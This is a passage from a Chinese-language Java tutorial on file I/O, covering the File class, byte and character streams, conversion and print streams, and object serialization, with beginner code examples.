根据指定的父路径和文件路径创建File对象 父路径和文件路径的划分： 父D:\\\\a, 文件路径b.txt: 可 父D:\\\\, 文件路径a\\\\b.txt: 可 示例: File f = new File(\"D:\\\\a, \"b.txt\"); 或 File f = new File(\"D:\\\\, \"a\\\\b.txt\"); File(File parent, String child): 根据指定的父路径对象和文件路径创建File对象 与上一条的区别：父路径是File对象 示例： 先创建：File parent = new File(\"D:\\\\a\"); File f = new File(parent, \"b.txt\"); 匿名调用：File f = new File(new File(\"D:\\\\a\"), \"b.txt\"); ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的创建功能 绝对路径和相对路径： 绝对路径： 固定不可变的路径，以盘符开头 相对路径： 相对于某个参照物的路径，不以盘符开头 在eclipse中，相对路径是指相对于当前项目的根目录 创建功能的返回值： 如果是void，则一定会创建成功； 如果是boolean，则不一定会创建成功，某些条件下会创建失败。 注：按需抛出异常并导异常包： ..main() throws IOException{..} boolean createNewFile(): 创建文件的功能 返回值为boolean类型： 当指定文件不存在时：创建文件并返回true, 选中eclipse中的项目名刷新后会在根目录下显示新建的文件 当指定文件已存在时：返回false 示例：File f = new File(\"a.txt\"); syso(f.createNewFile());//true, 再次运行为false boolean mkdir(): 创建文件夹的功能 返回值boolean型： 指定文件夹不存在时创建并返回true，否则，若文件夹已存在时返回false 示例：File f = new File(\"b\"); syso(f.mkdir());//结果：返回true, 且在项目根目录下新建b文件夹 boolean mkdirs(): 创建多层文件夹的功能 创建指定文件夹，当文件夹所在的目录不存在，则顺道一块创建了 mkdir没有的功能，没有上层文件时返回false 注：mac系统路径格式问题(路径是另一个方向的斜杠)： 没有上层文件时创建名为路径名的单层文件夹(eg. ‘c\\d\\e’)，mkdirs()返回的也是这个 示例： File f = new File(\"c\\\\d\\\\e\"); syso(f.mkdirs());//创建多层文件夹。而使用f.mkdir()返回false (指没有c\\\\d文件夹时) mac系统：路径是另一个方向的斜杠 File f = new File(\"c//d//e\");，两个方法的返回结果同wins系统 注：mkdirs()可以覆盖mkdir()方法，即可以用mkdirs() 替代mkdir()方法 创建的是文件还是文件夹，关键看使用的方法是哪个 代码：File f = new File(\"c.txt\"); syso(f.mkdir()); 看似创建的是c.txt文件，但是调用的是mkdir的方法，因此结果是生成一个名为“c.txt”的文件夹 注意：不要被new的部分迷惑，关键看调用的方法是要创建什么 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的删除功能 boolean delete(): 当指定的文件或文件夹存在时，删除该文件或文件夹，并返回true; 否则返回false 注意： 创建文件或文件夹有多个不同方法，但删除只有这一种； 删除文件夹： 当文件夹下没有其他文件或文件夹时，才能被删除 (系统删除的时候也是这样，先删除里面的内容，再删文件夹) 也因此，delete没办法删除多层文件夹，类似c\\\\d\\\\e 用此方法删除的文件或文件夹不走回收站，直接删除。 示例： 删除文件：File f = new File(\"a.txt\"); syso(f.delete());//删除文件a.txt 成功返回true 删除空文件夹：File f = new File(\"b\"); syso(f.delete());//删除文件夹b 成功返回true 删除多层文件夹的里层文件夹：File f = new File(\"c//d//e\"); syso(f.delete());//删除位于最里层的文件夹e ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的判断功能 boolean exists(): 判断文件或文件夹是否存在，存在时返回true，否则返回false 示例：File f = new File(\"a.txt\"); syso(f.exists);//文件存在，返回true boolean isAbsolute(): 判断File对象指向的路径是否是绝对路径，是则true，不是则false 注：不管判断的路径是否存在，只看格式是否是绝对路径 示例1：File f = new File(\"f.txt\"); syso(f.isAbsolute);//相对路径，返回false 示例2：File f = new File(\"/users/a.txt\"); syso(f.isAbsolute);//绝对路径，返回true boolean isDirectory(): 判断File对象指向的路径是否存在且是文件夹，是返回true，不是返回false 注：和isAbsolute()的区别：这里明确说明需要”存在“且”是“。 示例：File f = new File(\"c//d\"); syso(f.isDirectory());//是文件夹，返回true boolean isFile(): 判断File对象指向的路径是否存在且是文件，是返回true，不是返回false 注：和isAbsolute()的区别：这里明确说明需要”存在“且”是“。同isDirectory() 示例：File f = new File(\"a.txt\"); syso(f.isFile());//是文件夹，返回true boolean isHidden(): 判断File对象指向的路径(文件或文件夹)是否有隐藏属性，是则返回true，否则返回false 不同系统关于 隐藏 的具体定义不同: 在 UNIX 系统上，如果文件名以句点字符 (’.’) 开头，则认为该文件被隐藏。 在 Windows 系统上，如果在文件系统中文件被标记为隐藏，则认为该文件被隐藏。 示例：File f = new File(\"a.txt\"); syso(f.isHidden());//被标记了隐藏，则为true，否则为false ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:5","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的获取功能 File getAbsoluteFile(): 以File对象的形式返回当前File对象所指向的绝对路径, 等同于new File(this.getAbsolutePath())。 相当于把路径打包为File对象返回了 方法后加句点.，可以调用File的若干方法 注意：不管传入对象使用的是绝对路径还是相对路径，输出的都是绝对路径 示例：File f = new File(\"a.txt\"); syso(f.getAbsoluteFile());//Users/x...u/eclipse/eclipse-workspace/Demo/a.txt String getAbsolutePath(): 返回File对象所指向的绝对路径 方法后加句点.，只可以调用String的若干方法 注意：不管传入对象使用的是绝对路径还是相对路径，输出的都是绝对路径，同getAbsoluteFile(); 示例：File f = new File(\"a.txt\"); syso(f.getAbsolutePath());//Users/x...u/eclipse/eclipse-workspace/Demo/a.txt String getParent()和File getParentFile()： String getParent(): 返回此抽象路径名父目录的路径名字符串；如果此路径名没有指定父目录，则返回 null。 File getParentFile(): 返回此抽象路径名父目录的抽象路径名；如果此路径名没有指定父目录，则返回 null。 Patent需要提前指定，否则为null 注意：当父路径不存在，但定义过时，也会返回定义的父路径 代码示例： import java.io.File; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException { //先创建父路径，后求父路径 File parent = new File(\"b//c\"); File f = new File(parent, \"f.txt\"); if(!parent.exists()) { parent.mkdirs();//不知道是几层路径，直接用这个方法 } System.out.println(f.createNewFile());//true System.out.println(f.getParent());//b/c System.out.println(f.getParentFile());//b/c //父路径不存在时： File f2 = new File(new File(\"d//e\"), \"f2.txt\"); System.out.println(f2.getParent());//d/e System.out.println(f2.getParentFile());//d/e } } String getName(): 获取文件或文件夹的名称 示例1：File f = new File(\"b//c//a.txt\"); syso(f.getName());//a.txt 示例2：File f = new File(\"b//c\"); syso(f.getName());//c String getPath(): 返回创建File对象时所给的路径 即创建时是绝对路径则返回绝对，是相对路径则返回相对，是文件夹则返回文件夹名 示例：File f = new File(\"b//c\"); syso(f.getPath());//b/c long lastModified(): 以毫秒值的形式返回最后修改时间，与右键查看文件属性所得的最后修改时间一致 代码示例： import java.io.File; import java.io.IOException; import java.sql.Date; public class FileDemo { public static void main(String[] args) throws IOException { File f = new File(\"a.txt\"); System.out.println(f.lastModified());//1653365294140 Date d = new Date(1653365294140L);//Date的有参构造：输入long类型数据，加L System.out.println(d.toLocaleString());//2022年5月24日 下午12:08:14，参考a.txt文件可知这个时间正是最后修改时间 } } long length(): 返回文件的字节数，与右键查看文件属性所得的文件byte大小一致 不存在的文件或文件夹的大小返回：0 注意：只能查看文件的字节数，用此方法查看文件夹为0 此条：mac系统并不是，文件夹也会返回2的N次幂大小，即使是空文件夹也会返回 示例1：File f = new File(\"a.txt\"); syso(f.length());//查看属性是13 bytes，输出为13 示例2：File f = new File(\"c//d//a.txt\"); syso(f.length())//长路径名返回的也是最里层的文件或文件名的大小：13 String[] list() 返回当前路径下所有的文件和文件夹的名称 注意：只有指向文件夹的File对象才可以调用此方法，文件调用返回空指针异常。 示例： public class FileDemo { public static void main(String[] args) throws IOException { File f = new File(\"b\"); String [] s = f.list(); System.out.println(s);//[Ljava.lang.String;@d716361 for(int i = 0; i\u003cs.length; i++) { System.out.println(s[i]);//输出f.txt和c, 分别为b目录下的两个文件和文件夹 } } } File[] listFiles(): 以File的形式返回当前路径下所有的文件和文件夹的绝对路径 注：同样，只有指向文件夹的File对象才可以调用此方法，文件调用返回空指针异常。 与list()方法的区别：返回值类型不同，返回值为File()类型，可以调用File相关方法 示例：File f = new File(\"b\"); File[] files = f.listFiles(); static File[] listRoots(): 列出可用的文件系统根，即返回所有盘符 静态：可以直接用类名调用File.listRoots(); 注意： Windows系统：一般返回几个盘符目录 C:\\\\ and D:\\\\ mac系统：一般返回/ 示例： File[] roots = File.listRoots(); for (File root : roots) { System.out.println(root); } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:6","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的修改名字功能 boolean renameTo(File dest): 修改文件的名字 有两个参数，因此需要至少两个File 注意：不能修改为重名的文件 示例： File f = new File(\"a.txt\"); File f2 = new File(\"m.txt\"); System.out.println(f.renameTo(f2));//true ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:7","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的方法应用 题目1： 输出指定目录下的所有Java文件名 (包含子目录) 思路： 先考虑不包含子目录的所有Java文件，之后考虑通过递归处理子目录下的文件判断 listFile()获取所有文件和文件夹，遍历并判断是否是以\".java\"结尾的Java文件 之后处理一些细节，完善逻辑，增加鲁棒性等，详见代码注释 注意：包名中的句点 . 分隔符也是文件夹分级分隔符，路径中用斜杠分割 代码示例： import java.io.File; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException { File f = new File(\"src//test//StudentArray\"); method(f); } public static void method(File file) { if(file.isDirectory()) {//如果传入的是文件而不是文件名，程序也不会异常抛出终止，增加健壮性 File[] files = file.listFiles();//以File的形式返回当前路径下所有的文件和文件夹的绝对路径 for (File f : files) {//遍历并判断 if(f.isFile()) { if(f.getName().endsWith(\".java\")) {//获取字符串并判断是否是Java文件 System.out.println(f.getName());//如果符合，输出 } }else {//不是文件，就是文件夹，或者加个if判断 method(f);//如果是文件夹，递归调用method方法，以获取子目录下的Java文件 } } } } } 题目2： 删除指定的目录（包含子目录） 思路： 先删除所有的子文件和子文件夹，然后删除自己 删除子文件和子文件夹：先获取listFile(), 之后遍历，判断 如果是文件，直接删除； 如果是文件夹，递归调用method()方法，继续查看是否有文件和子目录 删除自己：简单，直接delete()即可 注意：不要随意删文件!!! 代码示例: import java.io.File; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException { File f = new File(\"b\"); System.out.println(f.exists()); method(f); } public static void method(File file) { if(file.isDirectory()) { //干掉自己的所有子文件和子目录 //先获取所有子文件和子目录 File[] files = file.listFiles(); for (File f: files) { if(f.isFile()) {//判断是否是文件 System.out.println(f.getName());//可视化此删除操作,非必要 f.delete(); }else if(f.isDirectory()) {//如果是文件夹，递归调用 method(f); } } //干掉自己这个目录 file.delete(); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:8","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:9","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"IO流分类 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"根据流向分： 输入流： 读取数据 FileReader – 父类Reader 输出流： 写出数据 FileWriter – 父类Writer ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"根据数据类型分： 字节流： 字节输入流： 读取数据：Inputstream 字节输出流： 写出数据：OutputStream 注意：字符流直接写入文件，不存缓冲区，因此可以不flush() 字符流： 字符输入流： 读取数据：Reader 字符输出流： 写出数据：Writer 区别： 比如汉字，如果按字节读取，会很慢，需要多次才能读一个，这时就需要字符流 但是有些数据就必须按字节读取，比如读取图片数据等 综上：字符流能做的字节流都能做，但是字节流能做的字符流不一定能做。 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字节流对象 字节输入流FileInputStream的构造方法： 两种：FileInputStream(File file)和FileInputStream(String name) FileInputStream(String name)的底层： this(name != null ? new File(name) : null);: 同File构造方法，先判断路径下文件是否存在，不存在则先创建File()对象 题目：使用字节流复制文本文件 思路: 创建字节输入/输出流对象； 两种读写方法：1. 一次读写一个字节；2. 一次读写一个字节数组； 释放资源。 代码示例： import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException{ //复制测试.png //创建字节流对象 FileInputStream fis = new FileInputStream(\"Student.java\"); FileOutputStream fos = new FileOutputStream(\"c//Student_copy.java\"); //一次读取一个字节 /* int by; while((by = fis.read()) != -1) { fos.write(by); }*/ //一次复制一个字节数组 int len;//用于存储读到的字符个数 byte[] bys = new byte[1024]; while((len = fis.read(bys)) != -1) { fos.write(bys, 0, len); } //释放资源 fis.close(); fos.close(); System.out.println(new File(\"c//Student_copy.java\").exists());//true } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"分别用字符流和字节流复制图片文件 字符类复制： 复制文件成功，但是会打不开，字符流复制图像文件的过程中丢失了部分字节导致图像文件打不开了 代码示例： import java.io.File; import java.io.FileReader; import java.io.FileWriter; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException { //复制测试.png //创建字符流对象 FileReader fr = new FileReader(\"复制测试.png\"); FileWriter fw = new FileWriter(\"c//复制测试.png\"); //一次复制一个字符数组 int len;//用于存储读到的字符个数 char[] chs = new char[1024]; while((len = fr.read(chs)) != -1) { fw.write(chs, 0, len); fw.flush(); } //释放资源 fw.close(); fr.close(); System.out.println(new File(\"c//复制测试.png\").exists());//测试是否创建成功：true } } 字节流复制 图像文件复制成功，且可以顺利打开 代码示例： import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; public class FileDemo { public static void main(String[] args) throws IOException{ //复制测试.png //创建字节流对象 FileInputStream fis = new FileInputStream(\"复制测试.png\"); FileOutputStream fos = new FileOutputStream(\"c//复制测试.png\"); //一次复制一个字符数组 int len;//用于存储读到的字符个数 byte[] bys = new byte[1024]; while((len = fis.read(bys)) != -1) { fos.write(bys, 0, len); } //释放资源 fis.close(); fos.close(); System.out.println(new File(\"c//复制测试.png\").exists());//true } } 小结： 二进制文件只能使用字节流进行复制 根据表将字节转换为字符，中间会丢失部分字节，对于二进制文件来说这种复制的文件会打不开 二进制文件：指使用Windows自带记事本打开是乱码的文件 文本文件的复制： 既可以使用字符流，也可以使用字节流 如果不确定使用字符流还是字节流： 使用字符流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:7:5","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"输入输出流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:8:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"标准输入输出流概述 System类的三个静态成员变量： err, in, out, 重点看后两个 静态：直接用类名调用 标准输入流：public static final InputStream in 字节输入流，用来读取键盘录入的数据 引用类型InputStream: 类似于public static final int a;，int是基本数据类型 静态：直接用类名调用 System.in; 或赋值给特定变量InputStream is = System.in; 常见应用：读取键盘录入的数据 示例：Scanner sc = new Scanner(System.in); 标准输出流：public static final PrintStream out 字节输出流，将数据输出到命令行 示例：System.out.println(); 两个转换流： OutputStreamWriter和InputStreamReader 字节流与字符流转换的桥梁 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:8:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"OutputStreamWriter 题目：读取指定文件，并输出到命令行 数据源：指定路径下的Java文件 BufferedReader 目的地：命令行 System.out 标准输出流的局限性： 由于标准输出流是字节输出流，只能输出字节或者字节数组，但是读取到的是字符串时，想进行输出还需要转换成字节数组，麻烦 代码示例：注意读取的是String, 写入的是字节流byte，需要转换 import java.io.BufferedReader; import java.io.FileReader; import java.io.IOException; import java.io.OutputStream; public class FileDemo { public static void main(String[] args) throws IOException{ //题目：读取指定文件，并输出到命令行 //创建输入流对象 BufferedReader br = new BufferedReader(new FileReader(\"Student.java\")); //创建输出流对象 OutputStream os = System.out; String line;//用于存储读取到的数据 while((line = br.readLine()) != null) {//readLine()是String, 写入字节流需要转换为字节 os.write(line.getBytes());//String换行为字节，下同 os.write(\"\\r\\n\".getBytes()); } //释放资源 os.close(); br.close(); } } 转换流：OutputStreamWriter： 要想通过标准输出流输出字符串，把标准输出流转换成一种字符输出流即可，即OutputStreamWriter OutputStreamWriter： 父类Writer，子类FileWriter, 是字符流通向字节流的桥梁，会把字符输出流转换成字节输出流 构造方法为传入OutputStream对象 为了获得最高效率，可考虑将 OutputStreamWriter 包装到 BufferedWriter 中，以避免频繁调用转换器。例如： Writer out = new BufferedWriter(new OutputStreamWriter(System.out));//多态 改进代码示例： import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.FileReader; import java.io.IOException; import java.io.OutputStreamWriter; public class FileDemo { public static void main(String[] args) throws IOException{ //题目：读取指定文件，并输出到命令行 //创建输入流对象 BufferedReader br = new BufferedReader(new FileReader(\"Student.java\")); //创建输出流对象: 转换流改进 + 缓冲流 //OutputStream os = System.out; //Writer w = new OutputStreamWriter(System.in); BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(System.out)); String line;//用于存储读取到的数据 while((line = br.readLine()) != null) {//转换流改进 bw.write(line); bw.newLine(); } //释放资源 bw.close(); br.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:8:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"InputStreamReader 题目：读取键盘录入的数据，并输出到指定路径的文件中 数据源：读取键盘录入的数据 System.in 目的地：指定路径的文件中 FileWriter 标准输入流的局限性： 标准输入流是字节输入流，写入需要的是字符输出流(FileWriter只能输入String或字符数组)，这中间需要转换，麻烦 代码示例： import java.io.FileWriter; import java.io.IOException; import java.io.InputStream; public class FileDemo { public static void main(String[] args) throws IOException{ //题目：读取键盘录入的数据，并输出到指定路径的文件中 //创建输入流对象 InputStream is = System.in; //创建输出流对象 FileWriter fw = new FileWriter(\"a.txt\"); //读写数据 byte[] bys = new byte[1024]; int len; while((len = is.read(bys)) != -1) { fw.write(new String(bys,0,len));//write需要传入String或字符数组，先把byte[]转为String fw.flush(); } //释放资源 fw.close(); is.close(); } } 转换流：InputStreamReader 需要把字节输入流转换成字符输入流，InputStreamReader OutputStreamWriter： 父类Reader，子类FileReader, 是字节流通向字符流的桥梁, 会把字节输入流转换成字符输入流 构造方法为传入InputStream对象 为了达到最高效率，可要考虑在 BufferedReader 内包装 InputStreamReader。例如： BufferedReader in = new BufferedReader(new InputStreamReader(System.in)); 改进的代码示例： import java.io.FileWriter; import java.io.IOException; import java.io.InputStreamReader; import java.io.Reader; public class FileDemo { public static void main(String[] args) throws IOException{ //题目：读取键盘录入的数据，并输出到指定路径的文件中 //创建输入流对象 //InputStream is = System.in; Reader r = new InputStreamReader(System.in);//使用转换流 //创建输出流对象 FileWriter fw = new FileWriter(\"a.txt\"); //读写数据 char[] chs = new char[1024];//修改为char数据 int len; while((len = r.read(chs)) != -1) { fw.write(chs,0,len);//直接读取不需要转换了 fw.flush(); } //释放资源 fw.close(); r.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:8:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:8:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"打印流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:9:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"打印流概述： 打印流只有输出流： 分为 字符打印流PrintWriter 和字节打印流PrintStream PrintWriter: 父类：Writer 向文本输出流打印对象的格式化表示形式。此类实现在 PrintStream 中的所有 print 方法 println(): 可以自动换行，不受不同系统的换行符的限制 不能输出字节，可以输出其他任意类型 通过某些配置，可以实现自动刷新 （只有在调用 println、printf 或 format 的其中一个方法时才可能完成此操作） 也是包装类，不具备写出功能 此类中的方法不会抛出 I/O 异常，尽管其某些构造方法可能抛出异常 也可以把字节输出流转换成字符输出流 PrintStream 父类：FilterOutputStream; 父类的父类：OutputStream PrintStream 打印的所有字符都使用平台的默认字符编码转换为字节 PrintStream 为其他输出流添加了功能，使它们能够方便地打印各种数据值表示形式 代码示例： import java.io.IOException; import java.io.PrintWriter; public class PrintWriterDemo { public static void main(String[] args) throws IOException { //创建打印流对象 PrintWriter pw = new PrintWriter(\"b.txt\"); //写出数据 pw.write(\"hello world \"); pw.write(\"java\"); //释放资源 pw.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:9:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"打印流特有功能 自动换行 使用PrintWriter的方法println()实现自动换行 代码示例： //创建打印流对象 PrintWriter pw = new PrintWriter(\"b.txt\"); //写出数据 pw.println(\"hello world \"); pw.println(\"java\"); //释放资源 pw.close(); 自动刷新 构造函数部分：PrintWriter(Writer out, boolean autoFlush) autoFlush传入是否自动刷新的boolean类型参数 注意前半部分传入的是Writer类型 另有：PrintWriter(OutputStream out, boolean autoFlush) 只有在调用 println、printf 或 format 的其中一个方法时才进行自动刷新 注意： 创建FileWriter的对象时传入的boolean参数：是否追加 创建打印流对象时传入的boolean参数：是否自动刷新 代码示例： import java.io.FileWriter; import java.io.IOException; import java.io.PrintWriter; public class PrintWriterDemo { public static void main(String[] args) throws IOException { //创建打印流对象 PrintWriter pw = new PrintWriter(new FileWriter(\"b.txt\"), true); //写出数据 pw.println(\"hello world \"); pw.println(\"java\"); //释放资源: 注释掉以后仍然可以刷新到文件中 //pw.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:9:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"使用打印流复制文本文件 数据源：Student.java BufferedReader 目的地：c//d//Student.java PrintWriter 打印流的优势： 省了两个步骤：换行和刷新，正是打印流的特有功能 代码示例： import java.io.BufferedReader; import java.io.FileReader; import java.io.FileWriter; import java.io.IOException; import java.io.PrintWriter; public class PrintWriterDemo { public static void main(String[] args) throws IOException { //创建输入流对象 BufferedReader br = new BufferedReader(new FileReader(\"Student.java\")); //创建输出流对象 PrintWriter pw = new PrintWriter(new FileWriter(\"c//d//Student.java\"), true);//开启自动刷新 String line;//用于存储读取到的每行数据 while((line = br.readLine()) != null) { pw.println(line);//省去换行和刷新 } //释放资源 pw.close(); br.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:9:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:9:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"对象操作流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"对象操作流概述 对象操作流：可以用于读写任意类型的对象 ObjectOutputStream: writeObject ObjectOutputStream(OutputStream out) ObjectInputStream: readObject ObjectInputStream(InputStream in) 注意： 使用对象输出流写出对象，只能使用对象输入流来读取对象 只能支持java.io.Serializable接口的对象写入流中 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"使用对象操作流读写数据 使用对象输出流写数据 步骤： 预备一个Student.java代码 创建对象输出流对象 创建学生对象 写出学生对象 释放资源 注意点： Student.java: 为了输出需要重写toString方法；针对序列化异常需要实现此异常接口，并重写方法 PS：虽然序列化异常的接口是空的，不需要额外重写什么方法 打开a.txt发现乱码多： 因为是需要对象输入流去读取的，不是人去读取 代码示例： //Student.java public class Student implements Serializable{...} //bjectStreamDemo.java import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class ObjectStreamDemo { public static void main(String[] args) throws IOException { //创建对象输出流的对象 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"a.txt\")); //创建学生对象 Student s = new Student(\"zhangsan\",18); Student s2 = new Student(\"lisi\",19); //写出学生对象 oos.writeObject(s); oos.writeObject(s2); //释放资源 oos.close(); } } 使用对象输入流读数据 步骤： 创建对象输入流的对象 读取对象 释放资源 注意点： 如果上一步写入的文件不太对，例如第一次运行时莫名其妙跑序列化异常，可以重新生成一下a.txt文件 首次遇到 EOFException 异常，用try-catch处理 代码示例： public static void main(String[] args) throws IOException, ClassNotFoundException { //创建对象输入流的对象 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"a.txt\")); //读取对象 try { while(true) { Object obj = ois.readObject(); System.out.println(obj); } }catch(EOFException e) { System.out.println(\"读到文件末尾了\"); } //释放资源 ois.close(); /* * Student [name=zhangsan, age=18] Student [name=lisi, age=19] 读到文件末尾了 * */ } 遇到的异常： Exception in thread \"main\" java.io.NotSerializableException: test.demo.Student NotSerializableException: 当实例需要具有序列化接口时，抛出此异常。序列化运行时或实例的类会抛出此异常。参数应该为类的名称。 ObjectOutputStream: 只能将支持 java.io.Serializable 接口的对象(Student.java)写入流中 Serializable: 源码：public interface Serializable {} 序列化，是一个标识窗口，只能起标识作用，没有方法； 当一个类的对象需要IO流进行读写时，这个类必须实现该接口 Exception in thread \"main\" java.io.EOFException 当输入过程中意外到达文件或流的末尾时，抛出此异常：手动循环到末尾时会直接抛出异常 不能解决的异常，需要try-catch来处理 其他许多输入操作返回一个特殊值表示到达流的末尾，而不是抛出异常：可以作为循环终止的判定条件 这里涉及到的序列化与反序列化问题 参考：java对象的序列化和反序列化详细解释 代码示例： import java.io.*; public class ObjectStreamTest { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(\"b.txt\"))); oos.writeObject(new Student(\"d\",1));//序列化Student对象,写入文件 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\"b.txt\"))); /* System.out.println(ois.readObject());*/ Student stu = (Student) (ois.readObject());//将Student对象加载到Java程序中,反序列化 System.out.println(stu); ois.close(); oos.close(); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:10:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"解决对象输入流读取对象异常的问题 针对EOFException 异常, 用try-catch解决显得有点被动 考虑提前算好加入的对象个数，可以将对象存到ArrayList中，之后遍历集合即可，避免程序读着读着就挂了 写入时：先添加到集合中，然后直接写入集合对象即可 读取时：先向下转型转为集合类，然后遍历集合即可 代码示例： import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.ArrayList; public class ObjectStreamDemo { public static void main(String[] args) throws IOException, ClassNotFoundException { //创建对象输出流的对象 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"b.txt\")); //写入创建集合，并写入学生对象 ArrayList\u003cStudent\u003e list = new ArrayList\u003cStudent\u003e(); list.add(new Student(\"zhangsan\",80)); list.add(new Student(\"lisi\",60)); oos.writeObject(list); //创建对象输入流的对象 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"b.txt\")); //读取对象 Object obj = ois.readObject(); //System.out.println(obj);//[Student [name=zhangsan, age=80], Student [name=lisi, age=60]] //向下转型：获取具体的子类对象 ArrayList\u003cStudent\u003e list2 = (ArrayList\u003cStudent\u003e) obj; for (Student student : list2){ System.out.println(student); } /* * Student [name=zhangsan, age=80] * Student [name=lisi, age=60] * */ //释放资源 oos.close(); 